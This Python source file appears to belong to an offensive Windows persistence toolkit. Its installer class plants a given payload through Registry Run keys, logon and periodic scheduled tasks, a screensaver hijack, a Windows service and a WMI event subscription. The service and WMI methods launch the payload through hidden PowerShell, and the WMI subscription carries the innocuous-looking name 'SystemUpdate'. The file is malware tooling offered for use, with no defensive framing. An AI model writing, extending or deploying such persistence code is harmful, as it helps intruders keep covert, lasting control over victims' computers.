"""
Persistence method installer - coordinates installation of all methods
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import (
    check_admin,
    validate_payload_path,
    wrap_payload_command,
    print_method_header,
    format_method_summary
)
from config import PERSISTENCE_METHODS


class PersistenceInstaller:
    """Handles installation of individual persistence methods"""
    
    def __init__(self, is_admin=False):
        """
        Initialize installer
        
        Args:
            is_admin: Whether running with admin privileges
        """
        self.is_admin = is_admin
        self.installed_methods = []
    
    def install_registry_run_user(self, payload_path):
        """Install Registry Run key (User-level)"""
        try:
            from registry_persistence import RegistryPersistence
            reg = RegistryPersistence()
            result = reg.method_run_key(payload_path)
            
            if result:
                self.installed_methods.append(result)
                return True, "Installed to HKCU\\Run"
            return False, "Installation failed"
            
        except ImportError:
            return False, "registry_persistence module not found"
        except Exception as e:
            return False, str(e)
    
    def install_registry_run_machine(self, payload_path):
        """Install Registry Run key (Machine-level)"""
        if not self.is_admin:
            return False, "Requires admin privileges"
        
        try:
            from registry_persistence import RegistryPersistence
            reg = RegistryPersistence()
            result = reg.method_run_key_local_machine(payload_path)
            
            if result:
                self.installed_methods.append(result)
                return True, "Installed to HKLM\\Run"
            return False, "Installation failed"
            
        except ImportError:
            return False, "registry_persistence module not found"
        except Exception as e:
            return False, str(e)
    
    def install_schtask_logon(self, payload_path):
        """Install Scheduled Task (Logon trigger)"""
        try:
            from scheduled_task_persistence import ScheduledTaskPersistence
            schtask = ScheduledTaskPersistence()
            task_name = schtask.generate_task_name()
            result = schtask.create_task_on_logon(task_name, payload_path)
            
            if result:
                self.installed_methods.append(result)
                return True, f"Task created: {task_name}"
            return False, "Task creation failed"
            
        except ImportError:
            return False, "scheduled_task_persistence module not found"
        except Exception as e:
            return False, str(e)
    
    def install_schtask_periodic(self, payload_path, interval_minutes=30):
        """Install Scheduled Task (Periodic trigger)"""
        try:
            from scheduled_task_persistence import ScheduledTaskPersistence
            schtask = ScheduledTaskPersistence()
            task_name = schtask.generate_task_name()
            result = schtask.create_task_on_schedule(
                task_name, 
                payload_path, 
                interval_minutes=interval_minutes
            )
            
            if result:
                self.installed_methods.append(result)
                return True, f"Task created: {task_name} (every {interval_minutes}m)"
            return False, "Task creation failed"
            
        except ImportError:
            return False, "scheduled_task_persistence module not found"
        except Exception as e:
            return False, str(e)
    
    def install_screensaver(self, payload_path):
        """Install Screensaver hijack"""
        try:
            from registry_persistence import RegistryPersistence
            reg = RegistryPersistence()
            result = reg.method_screensaver(payload_path)
            
            if result:
                self.installed_methods.append(result)
                return True, "Screensaver hijacked"
            return False, "Installation failed"
            
        except ImportError:
            return False, "registry_persistence module not found"
        except Exception as e:
            return False, str(e)
    
    def install_service(self, payload_path):
        """Install Windows Service"""
        if not self.is_admin:
            return False, "Requires admin privileges"
        
        try:
            from service_persistence import ServicePersistence
            service = ServicePersistence()
            service_name = service.generate_service_name()
            
            wrapper_cmd = wrap_payload_command(payload_path, 'powershell_hidden')
            result = service.create_service_with_wrapper(service_name, wrapper_cmd)
            
            if result:
                self.installed_methods.append(result)
                return True, f"Service created: {service_name}"
            return False, "Service creation failed"
            
        except ImportError:
            return False, "service_persistence module not found"
        except Exception as e:
            return False, str(e)
    
    def install_wmi_event(self, payload_path):
        """Install WMI Event Subscription"""
        if not self.is_admin:
            return False, "Requires admin privileges"
        
        try:
            from wmi_persistence import WMIPersistence
            wmi = WMIPersistence()
            
            wrapper_cmd = wrap_payload_command(payload_path, 'powershell_hidden')
            result = wmi.create_wmi_persistence(wrapper_cmd, "SystemUpdate")
            
            if result:
                self.installed_methods.append(result)
                return True, "WMI event subscription created"
            return False, "WMI creation failed"
            
        except ImportError:
            return False, "wmi_persistence module not found"
        except Exception as e:
            return False, str(e)
    
    def install_method(self, method_key, payload_path):
        """
        Install a specific persistence method
        
        Args:
            method_key: Key from PERSISTENCE_METHODS
            payload_path: Path to payload
            
        Returns:
            tuple: (success, message)
        """
        method_map = {
            'registry_run_user': self.install_registry_run_user,
            'registry_run_machine': self.install_registry_run_machine,
            'schtask_logon': self.install_schtask_logon,
            'schtask_periodic': self.install_schtask_periodic,
            'screensaver': self.install_screensaver,
            'service': self.install_service,
            'wmi_event': self.install_wmi_event
        }
        
        installer_func = method_map.get(method_key)
        if not installer_func:
            return False, f"Unknown method: {method_key}"
        
        return installer_func(payload_path)
    
    def get_installed_methods(self):
        """Get list of successfully installed methods"""
        return self.installed_methods